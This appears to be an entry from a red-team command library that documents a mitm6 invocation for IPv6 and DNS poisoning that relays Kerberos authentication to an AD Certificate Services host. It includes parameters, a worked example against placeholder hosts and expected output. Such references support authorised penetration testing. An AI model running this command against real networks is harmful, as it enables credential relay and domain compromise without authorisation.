---
id: 4571dc44-e39d-48c5-95a9-193ac695ffcf
name: run-mitm6-relay
type: command
executor: bash
data: >-
  sudo mitm6 --domain $_DOMAIN --host-allowlist $_TARGET_DOMAIN --relay
  $_CA_FQDN -v
output: null
created_at: '2023-04-06T03:56:05.989470+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
tags:
  - poisoning
  - ipv6
  - kerberos
verified: true
validated: true
---

# run-mitm6-relay

## Command

```bash
sudo mitm6 --domain $_DOMAIN --host-allowlist $_TARGET_DOMAIN --relay $_CA_FQDN -v
```

## Description

Performs LLMNR/mDNS/IPv6 poisoning to relay Kerberos auth to the specified CA.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| --domain $_DOMAIN | Target domain | Yes |
| --host-allowlist $_TARGET_DOMAIN | Allowed hosts | Yes |
| --relay $_CA_FQDN | Relay target FQDN | Yes |
| -v | Verbose output | No |

## Examples

### Basic Usage

```bash
sudo mitm6 --domain domain.local --host-allowlist target.domain.local --relay CA.domain.local -v
```

## Expected Output

[*] Sending Router Advertisement
[*] Poisoning detected for target.domain.local

## Related

- [[procedures/AD-CS-Relay-Attack-with-Rubeus-and-PetitPotam]]
- [[tools/mitm6]]
